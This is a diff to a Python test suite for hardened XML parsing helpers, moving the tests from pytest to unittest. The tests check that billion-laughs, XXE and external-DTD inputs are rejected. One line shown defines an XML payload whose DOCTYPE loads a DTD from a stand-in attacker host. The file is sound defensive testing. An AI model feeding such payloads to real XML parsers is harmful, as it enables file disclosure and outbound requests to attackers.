@@ -1,8 +1,9 @@
 """Tests for hardened XML parsing helpers (WEB-5305 / Aikido XXE findings)."""
 
+import tempfile
+import unittest
 import xml.etree.ElementTree as ET
-
-import pytest
+from pathlib import Path
 
 from scripts.coding_discovery_tools.xml_helpers import (
     UnsafeXMLError,
@@ -30,61 +31,72 @@ XXE_FILE_READ = (
 EXTERNAL_DTD = '<!DOCTYPE root SYSTEM "http://attacker.example/evil.dtd"><root/>'
 
 
-class TestSafeXmlFromstring:
+class TestSafeXmlFromstring(unittest.TestCase):
     def test_parses_benign_document(self):
         root = safe_xml_fromstring(
             "<application><component name='McpServers'><option value='x'/></component></application>"
         )
-        assert root.find("component").get("name") == "McpServers"
+        self.assertEqual(root.find("component").get("name"), "McpServers")
 
     def test_parses_document_with_xml_declaration(self):
-        root = safe_xml_fromstring("<?xml version='1.0' encoding='UTF-8'?><idea-plugin><id>a.b</id></idea-plugin>")
-        assert root.find("id").text == "a.b"
+        root = safe_xml_fromstring(
+            "<?xml version='1.0' encoding='UTF-8'?><idea-plugin><id>a.b</id></idea-plugin>"
+        )
+        self.assertEqual(root.find("id").text, "a.b")
 
     def test_rejects_billion_laughs(self):
-        with pytest.raises(UnsafeXMLError):
+        with self.assertRaises(UnsafeXMLError):
             safe_xml_fromstring(BILLION_LAUGHS)
 
     def test_rejects_external_entity(self):
-        with pytest.raises(UnsafeXMLError):
+        with self.assertRaises(UnsafeXMLError):
             safe_xml_fromstring(XXE_FILE_READ)
 
     def test_rejects_external_dtd(self):
-        with pytest.raises(UnsafeXMLError):
+        with self.assertRaises(UnsafeXMLError):
             safe_xml_fromstring(EXTERNAL_DTD)
 
     def test_unsafe_error_is_caught_by_parse_error_handlers(self):
         # Callers only catch ET.ParseError; unsafe files must be skippable the same way.
-        with pytest.raises(ET.ParseError):
+        with self.assertRaises(ET.ParseError):
             safe_xml_fromstring(XXE_FILE_READ)
 
     def test_malformed_raises_parse_error(self):
-        with pytest.raises(ET.ParseError):
+        with self.assertRaises(ET.ParseError):
             safe_xml_fromstring("<a><unclosed>")
 
 
-class TestSafeXmlParse:
-    def test_parses_benign_file(self, tmp_path):
-        xml_path = tmp_path / "mcpServers.xml"
+class TestSafeXmlParse(unittest.TestCase):
+    def setUp(self):
+        self._tmpdir = tempfile.TemporaryDirectory()
+        self.addCleanup(self._tmpdir.cleanup)
+        self.tmp_path = Path(self._tmpdir.name)
+
+    def test_parses_benign_file(self):
+        xml_path = self.tmp_path / "mcpServers.xml"
         xml_path.write_text(
             "<?xml version='1.0'?><application><McpServerConfigurationProperties/></application>"
         )
         tree = safe_xml_parse(xml_path)
-        assert tree.getroot().find("McpServerConfigurationProperties") is not None
-        assert len(tree.findall(".//McpServerConfigurationProperties")) == 1
+        self.assertIsNotNone(tree.getroot().find("McpServerConfigurationProperties"))
+        self.assertEqual(len(tree.findall(".//McpServerConfigurationProperties")), 1)
 
-    def test_rejects_xxe_file(self, tmp_path):
-        xml_path = tmp_path / "evil.xml"
+    def test_rejects_xxe_file(self):
+        xml_path = self.tmp_path / "evil.xml"
         xml_path.write_text(XXE_FILE_READ)
-        with pytest.raises(UnsafeXMLError):
+        with self.assertRaises(UnsafeXMLError):
             safe_xml_parse(xml_path)
 
-    def test_malformed_file_raises_parse_error(self, tmp_path):
-        xml_path = tmp_path / "broken.xml"
+    def test_malformed_file_raises_parse_error(self):
+        xml_path = self.tmp_path / "broken.xml"
         xml_path.write_text("not xml at all")
-        with pytest.raises(ET.ParseError):
+        with self.assertRaises(ET.ParseError):
             safe_xml_parse(xml_path)
 
-    def test_missing_file_raises_os_error(self, tmp_path):
-        with pytest.raises(OSError):
-            safe_xml_parse(tmp_path / "does_not_exist.xml")
+    def test_missing_file_raises_os_error(self):
+        with self.assertRaises(OSError):
+            safe_xml_parse(self.tmp_path / "does_not_exist.xml")
+
+
+if __name__ == "__main__":
+    unittest.main()
